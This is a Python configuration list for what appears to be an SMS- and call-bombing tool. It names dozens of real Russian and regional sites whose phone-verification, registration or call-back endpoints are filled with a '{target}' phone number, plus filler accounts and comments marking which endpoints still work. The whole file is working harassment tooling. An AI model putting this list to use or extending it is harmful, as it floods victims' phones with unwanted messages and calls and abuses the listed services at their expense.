services = [
    {
        "name": "RuTaxi",
        "method": "POST",
        "url": "https://moscow.rutaxi.ru/ajax_keycode.html",
        "params": {
            "l": "{cc}{target}"
        },
        "identifier": "200"
    }, # RuTaxi +
{
        "name": "MTS TV",
        "method": "POST",
        "url": "https://api.mtstv.ru/v1/users",
        "json": {
            "msisdn": "{cc}{target}"
        },
        "identifier": "200"
    }, # MTS TV +
{
        "name": "MTS",
        "method": "POST",
        "url": 'https://api.mtstv.ru/v1/users',
        'json':{'msisdn': '{cc}{target}'},
        "identifier": "200"
    }, # MTS +
{
        "name": "Rutube",
        "method": "POST",
        "url": 'https://rutube.ru/api/accounts/sendpass/phone',
        'params': {'phone': '+{cc}{target}'},
        "identifier": "200"
    }, # Rutube +
{
        "name": "Twitch",
        "method": "POST",
        "url": "https://passport.twitch.tv/register?trusted_request=true",
        "json": {"Birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": '98HYtybh_9756', "phone_number": '{cc}{target}',"username": 'Rthhe7654_utr'},
        "identifier": "200"
    }, # Twitch +
    {
        "name": "qlean",
        "method": "POST",
        "url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
        "params": {
            "phone": "{cc}{target}"
        },
        "identifier": "request_id"
    }, # Qlean -
    {
        "name": "mail.ru",
        "method": "POST",
        "url": "https://cloud.mail.ru//api/v2/notify/applink",
        "json": {
            "phone": "+{cc}{target}",
            "api": "2",
            "email": '{semail}',
            "x-email": 'xxx{semail}'
        },
        "identifier": "200"
    }, # Mail.ru +
    {
        "name": "youla.ru",
        "method": "POST",
        "url": "https://youla.ru/web-api/auth/request_code",
        "params": {
            "phone": "{cc}{target}"
        },
        "identifier": "code_length"
    }, # Youla +
    {
        "name": "ivi.ru",
        "method": "POST",
        "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6",
        "params": {
            "phone": "+{cc}{target}"
        },
        "identifier": "true"
    }, # IVI +
    {
        "name": "delitime.ru",
        "method": "POST",
        "url": "https://api.delitime.ru/api/v2/signup",
        "params": {
            "SignupForm[username]": "{cc}{target}",
            "SignupForm[device_type]": "3"
        },
        "identifier": "true"
    }, # Delitime +
    {
        "name": "icq.com",
        "method": "POST",
        "url": "https://www.icq.com/smsreg/requestPhoneValidation.php'",
        "params": {'msisdn': '{cc}{target}', "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"},
        "identifier": "200"
    }, # ICQ +
    {
        'name': 'grab',
        'method': "POST",
        'url': "https://p.grabtaxi.com/api/passenger/v2/profiles/register",
        'params':
            {
                'phoneNumber': '{target}',
                'countryCode': '{cc}',
                'name': 'Ilya',
                'email': '{email}',
                'deviceToken': '*'
            },
        "identifier": "200"
    }, # Grab -
{
        'name': 'BelcaCar',
        'method': "POST",
        'url': "https://belkacar.ru/get-confirmation-code",
        'params':
            {
                'phone': '+{cc}{target}',
            },
        "identifier": "200"
    }, # BelcaCar -
{
        'name': 'Sunlight',
        'method': "POST",
        'url': "https://api.sunlight.net/v3/customers/authorization/",
        'params':
            {
                'phone': '{cc}{target}',
            },
        "identifier": "200"
    }, # Sunlight +
{
        'name': 'Cloud mail.ru',
        'method': "POST",
        'url': "https://cloud.mail.ru/api/v2/notify/applink",
        'params':
            {
                'phone': '{cc}{target}',
            },
        "identifier": "200"
    }, # Cloud Mail.ru +
{
        'name': 'KFC',
        'method': "POST",
        'url': "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
        'json':
            {
                'phone': '+{cc}{target}',
            },
        "identifier": "200"
    }, # KFC -
{
        'name': 'UTAIR',
        'method': "POST",
        'url': "https://b.utair.ru/api/v1/login/",
        'params':
            {
                'phone': '{ccc}{target}',
            },
        "identifier": "200"
    }, # UTAIR -
{
        'name': 'Tinder',
        'method': "POST",
        'url': "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
        'params':
            {
                'phone_number': '{cc}{target}',
            },
        "identifier": "200"
    }, # Tinder +-
{
        'name': 'OK.ru',
        'method': "POST",
        'url': "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
        'params':
            {
                'st.r.phone': '+{cc}{target}',
            },
        "identifier": "200"
    }, # Ok.ru +
{
        'name': 'Karusel',
        'method': "POST",
        'url': "https://app.karusel.ru/api/v1/phone/",
        'params':
            {
                'phone': '{cc}{target}',
            },
        "identifier": "200"
    }, # Karusel -
{
        'name': 'Yandex Eda',
        'method': "POST",
        'url': "https://eda.yandex/api/v1/user/request_authentication_code",
        'json':
            {
                'phone_number': '+{cc}{target}',
            },
        "identifier": "200"
    }, # Yandex.Eda +
    {
        'name': 'Tinkoff',
        'method': 'POST',
        'url': "https://api.tinkoff.ru/v1/sign_up",
        'params':
        {
            'phone': '+{cc}{target}'
        },
        "identifier": "200"
    }, # Tinkoff +-
{
        'name': 'Rabota.ru',
        'method': 'POST',
        'url': "https://www.rabota.ru/remind",
        'params':
        {
            'credential': '{cc}{target}'
        },
        "identifier": "200"
    }, # Rabota.ru -
{
        'name': 'Citilink',
        'method': 'POST',
        'url': "https://www.citilink.ru/registration/confirm/phone/+{cc}{target}",
        'params':
        {},
        "identifier": "200"
    }, # Citilink +
{
        'name': 'Beltelecom',
        'method': 'POST',
        'url': "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
        'params':
        {'phone': '{cc}{target}'},
        "identifier": "ok"
    }, # Beltelecome +
{
        'name': 'Lenta',
        'method': 'POST',
        'url': "https://lenta.com/api/v1/authentication/requestValidationCode",
        'json':
        {'phone': '+{cc}{target}'},
        "identifier": "phoneNumber"
    }, # Lenta +
{
        'name': 'Deliviry',
        'method': 'POST',
        'url': "https://www.delivery-club.ru/ajax/user_otp",
        'params': {'phone': '{cc}{target}'},
        "identifier": "200"
    }, # Delivery -
{
        'name': 'Taxi3040',
        'method': 'POST',
        'url': "https://3040.com.ua/taxi-ordering",
        'params': {'callback-phone': '{cc}{target}'},
        "identifier": "200"
    }, # Taxi3040
{
        'name': 'Zoloto585',
        'method': 'POST',
        'url': "https://zoloto585.ru/api/bcard/reg/",
        'json': {
                "name": 'Михаил',
                "surname": 'Зубенко',
                "patronymic": 'Петрович',
                "sex": "m",
                "birthdate": "11.10.1997",
                "phone": '{formated}', # "+* (***) ***-**-**"
                "email": '{email}',
                "city": 'Москва',
            },
        "identifier": "200"
    }, # Zoloto585
{
    'name': 'AlfaLife',
    'method': 'POST',
    'url': "https://alfalife.cc/auth.php",
    'params': {'phone': '{target}'},
    "identifier": "200"
}, # AlfaLife
{
    'name': 'alpari',
    'method': 'POST',
    'url': "https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
    'headers': {"Referer": "https://alpari.com/en/registration/"},
    'json': {
                "client_type": "personal",
                "email": '{email}',
                "mobile_phone": '{cc}{target}',
                "deliveryOption": "sms",
            },
    "identifier": "200"
}, # alpari
{
    'name': 'Apteka ru',
    'method': 'POST',
    'url': "https://apteka.ru/_action/auth/getForm/",
    'params': {
                "form[NAME]": "",
                "form[PERSONAL_GENDER]": "",
                "form[PERSONAL_BIRTHDAY]": "",
                "form[EMAIL]": "",
                "form[LOGIN]": '{formated}', # "+* (***) ***-**-**"
                "form[PASSWORD]": 'SurNameIsGood15',
                "get-new-password": "Получите пароль по SMS",
                "user_agreement": "on",
                "personal_data_agreement": "on",
                "formType": "simple",
                "utc_offset": "120",
            },
    "identifier": "200"
}, # Apteka ru
{
    'name': 'AtPrime',
    'method': 'POST',
    'url': "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
    'params': {'phone': '{cc}{target}'},
    "identifier": "200"
}, # AtPrime
{
    'name': 'AV',
    'method': 'POST',
    'url': "https://oauth.av.ru/check-phone",
    'json': {'phone': '{formated}'}, # "+* (***) ***-**-**"
    "identifier": "200"
}, # AV
{
    'name': 'avtobzvon',
    'method': 'GET',
    'url': "https://avtobzvon.ru/request/makeTestCall",
    'params': {'to': '{cformated}'}, # "(***) ***-**-**"
    "identifier": "200"
}, # avtobzvon
{
    'name': 'BamperBy',
    'method': 'POST',
    'url': "https://bamper.by/registration/?step=1",
    'params': {
                "phone": "+{cc}{target}",
                "submit": "Запросить смс подтверждения",
                "rules": "on",
            },
    "identifier": "200"
}, # BamperBy
{
    'name': 'Bartokyo',
    'method': 'POST',
    'url': "https://bartokyo.ru/ajax/login.php",
    'params': {
                "user_phone": '{formated}' # "+* (***) ***-****",
            },
    "identifier": "200"
}, # Bartokyo
{
    'name': 'Benzuber',
    'method': 'POST',
    'url': "https://app.benzuber.ru/login",
    'params': {"phone": "+{cc}{target}"},
    "identifier": "200"
}, # Benzuber
{
    'name': 'Bluefin',
    'method': 'POST',
    'url': "https://bluefin.moscow/auth/register/",
    'params': {
                "phone": '{cformated}', # "(***)***-**-**"
                "sendphone": "Далее",
            },
    "identifier": "200"
}, # Bluefin
{
    'name': 'Buzzols',
    'method': 'GET',
    'url': "https://it.buzzolls.ru:9995/api/v2/auth/register",
    'headers': {"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"},
    'params': {"phone": "+{cc}{target}"},
    "identifier": "200"
}, # Buzzols
{
    'name': 'Call2Friends',
    'method': 'GET',
    'url': "https://call2friends.com/call-my-phone/web/request-free-call",
    'params': {
                "phone": "{cc}{target}",
                "domain": "CALL2FRIENDS",
                "browser": "undefined",
            },
    "identifier": "200"
}, # Call2Friends
{
    'name': 'CallMyPhone',
    'method': 'POST',
    'url': "https://callmyphone.org/do-call",
    'params': {"phone": "{cc}{target}", "browser": "undefined",},
    "identifier": "200"
}, # CallMyPhone
{
    'name': 'CarSmile',
    'method': 'POST',
    'url': "https://api.carsmile.com/",
    'json': {
                "operationName": "enterPhone",
                "variables": {"phone": '{cc}{target}'},
                "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",
            },
    "identifier": "200"
}, # CarSmile
{
    'name': 'Cian',
    'method': 'POST',
    'url': "https://api.cian.ru/sms/v1/send-validation-code/",
    'json': {"phone": "+{cc}{target}", "type": "authenticateCode"},
    "identifier": "200"
}, # Cian
{
    'name': 'Cinema5',
    'method': 'POST',
    'url': "https://cinema5.ru/api/phone_code",
    'params': {"phone": '{formated}'}, # "+* (***) ***-**-**"
    "identifier": "200"
}, # Cinema5
{
    'name': 'City24',
    'method': 'POST',
    'url': "https://city24.ua/personalaccount/account/registration",
    'params': {"PhoneNumber": '{cc}{target}'},
    "identifier": "200"
}, # City24
{
    'name': 'CleverSite',
    'method': 'POST',
    'url': "https://clients.cleversite.ru/callback/run.php",
    'params': {
                "siteid": "62731",
                "num": '{cc}{target}',
                "title": "Онлайн-консультант",
                "referrer": "https://m.cleversite.ru/call",
            },
    "identifier": "200"
}, # CleverSite
{
    'name': 'Creditter',
    'method': 'POST',
    'url': "https://api.creditter.ru/confirm/sms/send",
    'json': {
                "phone": '{formated}', # "+* (***) ***-**-**"
                "type": "register",
            },
    "identifier": "200"
}, # Creditter
{
    'name': 'Dianet',
    'method': 'POST',
    'url': "https://my.dianet.com.ua/send_sms/",
    'params': {"phone": '{target}'},
    "identifier": "200"
}, # Dianet
{
    'name': 'Dostaevsky',
    'method': 'POST',
    'url': "https://dostaevsky.ru/auth/send-sms",
    'params': {"phone": '{ccformated}', "_token": 'XSRF-TOKEN'},
    "identifier": "200"
}, # Dostaevsky
{
    'name': 'EasyPay',
    'method': 'POST',
    'url': "https://api.easypay.ua/api/auth/register",
    'json': {"phone": '{cc}{target}', "password": '12_XFdcvbu'},
    "identifier": "200"
}, # EasyPay
{
    'name': 'Edostav',
    'method': 'POST',
    'url': "https://vladimir.edostav.ru/site/CheckAuthLogin",
    'params': {"phone_or_email": '+{cc}{target}'},
    "identifier": "200"
}, # Edostav
{
    'name': 'Egroshi',
    'method': 'POST',
    'url': "https://e-groshi.com/online/reg",
    'params': {
                "first_name":'Зубенко',
                "last_name": 'Михаил',
                "third_name": 'Петрович',
                "phone": '{formated}',
                "password": 'ASE_09563jh',
                "password2": 'ASE_09563jh',
            },
    "identifier": "200"
}, # Egroshi
{
    'name': 'Eldarado',
    'method': 'GET',
    'url': "https://api.eldorado.ua/v1/sign/",
    'params': {
                "login": '{cc}{target}',
                "step": "phone-check",
                "fb_id": "null",
                "fb_token": "null",
                "lang": "ru",
            },
    "identifier": "200"
}, # Eldarado
{
    'name': 'ETM',
    'method': 'POST',
    'url': "https://www.etm.ru/cat/runprog.html",
    'params': {
                "m_phone": '{target}',
                "mode": "sendSms",
                "syf_prog": "clients-services",
                "getSysParam": "yes",
            },
    "identifier": "200"
}, # ETM
{
    'name': 'FiestaPizza',
    'method': 'POST',
    'url': "https://2407.smartomato.ru/account/session",
    'json': {
                "phone": '{formated}',
                "g-recaptcha-response": None,
            },
    "identifier": "200"
}, # FiestaPizza
{
    'name': 'FiestaPizza',
    'method': 'GET',
    'url': "https://2407.smartomato.ru/account/session",
    'params': {
                "phone": '+{cc}{target}',
            },
    "identifier": "200"
}, # FindClone
{
    'name': 'FixPrice',
    'method': 'POST',
    'url': "https://fix-price.ru/ajax/register_phone_code.php",
    'params': {
                "register_call": "Y",
                "action": "getCode",
                "phone": "+{cc}{target}",
            },
    "identifier": "200"
}, # FixPrice
{
    'name': 'FriendsClub',
    'method': 'POST',
    'url': "https://friendsclub.ru/assets/components/pl/connector.php",
    'params': {"casePar": "authSendsms", "MobilePhone": "+{cc}{target}"},
    "identifier": "200"
}, # FriendsClub
]